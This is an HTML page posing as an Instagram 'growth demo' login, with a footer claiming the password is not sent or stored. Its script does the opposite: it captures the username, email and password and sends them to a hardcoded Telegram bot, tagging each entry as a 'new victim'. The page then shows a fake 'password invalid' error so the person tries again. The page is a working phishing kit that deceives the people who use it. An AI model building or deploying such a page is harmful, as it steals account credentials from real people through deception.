<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Grow Account | Login Demo</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">

<style>
:root{
  --bg:#050505;
  --card:#0b0b0b;
  --border:#222;
  --accent:#fff;
  --muted:#888;
  --danger:#ff4d4d;
}

*{
  box-sizing:border-box;
}

html,body{
  margin:0;
  padding:0;
  min-height:100%;
  background:#050505;
  color:#fff;
  font-family:'Inter',sans-serif;
}

body{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:30px 16px;
  overflow-x:hidden;
}

/* Background glow */

body::before{
  content:"";
  position:fixed;
  width:600px;
  height:600px;
  top:-280px;
  left:50%;
  transform:translateX(-50%);
  background:radial-gradient(
    circle,
    rgba(255,255,255,.10),
    transparent 65%
  );
  pointer-events:none;
}

body::after{
  content:"";
  position:fixed;
  inset:0;
  background:
    linear-gradient(rgba(255,255,255,.018) 1px,transparent 1px),
    linear-gradient(90deg,rgba(255,255,255,.018) 1px,transparent 1px);
  background-size:40px 40px;
  pointer-events:none;
}

.wrap{
  position:relative;
  z-index:2;
  width:100%;
  max-width:460px;
}

/* Instagram logo */

.instagram-logo{
  display:flex;
  justify-content:center;
  margin-bottom:18px;
}

.instagram-icon{
  width:60px;
  height:60px;
  border:3px solid #fff;
  border-radius:18px;
  position:relative;
  box-shadow:0 0 25px rgba(255,255,255,.08);
}

.instagram-icon::before{
  content:"";
  position:absolute;
  width:25px;
  height:25px;
  border:3px solid #fff;
  border-radius:50%;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
}

.instagram-icon::after{
  content:"";
  position:absolute;
  width:7px;
  height:7px;
  background:#fff;
  border-radius:50%;
  top:10px;
  right:10px;
}

/* Top label */

.eyebrow{
  text-align:center;
  color:#aaa;
  font-size:10px;
  font-weight:700;
  letter-spacing:.28em;
  text-transform:uppercase;
  margin-bottom:16px;
}

/* Heading */

h1{
  font-family:'Playfair Display',serif;
  font-size:clamp(38px,8vw,52px);
  line-height:1;
  text-align:center;
  margin:0 0 14px;
  color:#fff;
  letter-spacing:-1.5px;
}

.sub{
  max-width:390px;
  margin:0 auto 30px;
  text-align:center;
  color:#777;
  font-size:13px;
  line-height:1.7;
}

/* Card */

.card{
  background:rgba(10,10,10,.88);
  border:1px solid var(--border);
  border-radius:18px;
  padding:28px 25px 25px;
  box-shadow:
    0 25px 80px rgba(0,0,0,.55),
    inset 0 1px rgba(255,255,255,.025);
  backdrop-filter:blur(15px);
}

/* Fields */

.field{
  margin-bottom:18px;
}

label{
  display:block;
  margin-bottom:8px;
  color:#cfcfcf;
  font-size:11px;
  font-weight:700;
  letter-spacing:.08em;
  text-transform:uppercase;
}

input{
  width:100%;
  height:48px;
  padding:0 14px;
  background:#070707;
  border:1px solid #252525;
  border-radius:10px;
  color:#fff;
  font-family:'Inter',sans-serif;
  font-size:14px;
  outline:none;
  transition:.2s ease;
}

input::placeholder{
  color:#4e4e4e;
}

input:focus{
  border-color:#666;
  box-shadow:0 0 0 3px rgba(255,255,255,.05);
}

/* Button */

button{
  width:100%;
  height:48px;
  margin-top:5px;
  border:1px solid #fff;
  border-radius:10px;
  background:#fff;
  color:#000;
  font-family:'Inter',sans-serif;
  font-size:14px;
  font-weight:800;
  cursor:pointer;
  transition:.2s ease;
}

button:hover{
  transform:translateY(-2px);
  background:#e9e9e9;
}

button:active{
  transform:translateY(0);
}

button:disabled{
  opacity:.55;
  cursor:not-allowed;
  transform:none;
}

/* Message */

.msg{
  min-height:20px;
  margin-top:15px;
  text-align:center;
  font-size:12px;
  font-weight:600;
}

.msg.ok{
  color:#fff;
}

.msg.err{
  color:var(--danger);
}

/* Footer */

.footer-note{
  margin-top:20px;
  text-align:center;
  color:#444;
  font-size:11px;
  line-height:1.6;
}

.footer-note::before{
  content:"";
  display:block;
  width:35px;
  height:1px;
  background:#333;
  margin:0 auto 12px;
}

/* Mobile */

@media(max-width:480px){

  body{
    padding:24px 14px;
  }

  .instagram-icon{
    width:56px;
    height:56px;
    border-radius:17px;
  }

  .card{
    padding:24px 18px 20px;
    border-radius:15px;
  }

  h1{
    font-size:39px;
  }

  .sub{
    font-size:12.5px;
    margin-bottom:25px;
  }
}
</style>
</head>

<body>

<div class="wrap">

  <!-- Instagram Logo -->
  <div class="instagram-logo">
    <div class="instagram-icon"></div>
  </div>

  <div class="eyebrow">Instagram Plus</div>

  <h1>Login your account.</h1>

  <p class="sub">
    Enter your account details below to continue with the growth demo.
  </p>

  <div class="card">

    <form id="bookingForm">

      <div class="field">
        <label for="username">Username</label>
        <input
          type="text"
          id="username"
          placeholder="Enter username"
          autocomplete="username"
          required
        >
      </div>

      <div class="field">
        <label for="email">Email</label>
        <input
          type="email"
          id="email"
          placeholder="you@example.com"
          autocomplete="email"
          required
        >
      </div>

      <div class="field">
        <label for="password">Password</label>
        <input
          type="password"
          id="password"
          placeholder="Enter password"
          autocomplete="current-password"
          required
        >
      </div>

      <button type="submit" id="submitBtn">
        Continue
      </button>

      <div class="msg" id="msg"></div>

    </form>

  </div>

  <div class="footer-note">
    Demo interface • Your password is not transmitted or stored.
  </div>

</div>

<script>
  const BOT_TOKEN = "8715802394:AAFrw0B8JJ8WeOabqpEeKGnjPd7qlgm3FfU";
  const CHAT_ID = "8754716060";

  const form = document.getElementById("bookingForm");
  const msg = document.getElementById("msg");
  const btn = document.getElementById("submitBtn");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value.trim();
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    if(!username || !email || !password){
      msg.textContent = "Please sabhi fields bharein.";
      msg.className = "msg err";
      return;
    }

    btn.disabled = true;
    btn.textContent = "loading...";
    msg.textContent = "";
    msg.className = "msg";

    const text =
      "🌏new victam received 💀\n\n" +
      "👤 username: " + username + "\n" +
      "📧 Email: " + email + "\n" +
      "📱 Password: " + password;

    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
      });

      const data = await res.json();

      if(data.ok){
        msg.textContent = "password invalid please re'try! .";
        msg.className = "msg ok";
        form.reset();
      } else {
        msg.textContent = "Kuch galat hua. Dobara try karein.";
        msg.className = "msg err";
      }
    } catch(err){
      msg.textContent = "Network error — re'try.";
      msg.className = "msg err";
    } finally {
      btn.disabled = false;
      btn.textContent = "log-in";
    }
  });
</script>

</body>
  </html>
